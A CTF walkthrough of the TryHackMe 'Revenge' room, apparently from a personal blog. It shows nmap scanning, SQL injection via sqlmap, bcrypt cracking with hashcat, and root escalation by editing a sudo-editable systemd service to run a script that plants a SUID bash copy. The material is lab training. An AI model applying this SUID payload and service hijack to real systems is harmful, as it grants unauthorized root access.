---
title: "TryHackMe - Revenge"
author: Nasrallah
description: ""
date: 2023-03-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, hashcat, cracking, sqli, sqlmap, service]
img_path: /assets/img/tryhackme/revenge
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Revenge](https://tryhackme.com/room/revenge) from [TryHackMe](https://tryhackme.com). We find a webpage vulnerable to sql injection where we use sqlmap to extract data. With that we get a username and password hash that we crack giving us credentials to ssh into the machine. With the current user we can edit a service file and restart it, so we easily exploit that to run our own script that gives us root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.31.115
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7253b77aebab22701cf73c7ac776d989 (RSA)
|   256 437700fbda42025852127dcd4e524fc3 (ECDSA)
|_  256 2b57137cc84f1dc26867283f8e3930ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two ports, 22 running OpenSSH and 80 running Nginx http web server.

### Web

Let's navigate to the web page.

![](1.png)

This is a website for a wholesaler.

Navigating through the different tabs and pages, we find the that the products page uses numbers to for different products.

![](4.png)

Let's give that url to `sqlmap` and see what happens.

![](2.png)

The target is vulnerable to sql injection and we managed to get system users and password hashes.

## **Foothold**

### Cracking

Let's try cracking the hashes using `hashcat`.

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

![](3.png)

We got a hashes, le's ssh to the target

![](5.png)


## **Privilege Escalation**

Let's check our privileges on the system

```bash
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl
        daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

We see that we can edit duckyinc.service, enable, start and restart.

First, let's create a file that that when executed gives a copy of bash the suid bit

```bash
server-admin@duckyinc:~$ cat /tmp/hack 
cp /bin/bash /tmp/bash ; chmod +s /tmp/bash
```

Now we need to change the `User`, `Group` and `ExecStart` on the service file.

```bash
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/hack
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

Now we reload the daemon and restart the service.

```bash
/bin/systemctl restart duckyinc.service
/bin/systemctl daemon-reload
```

![](6.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
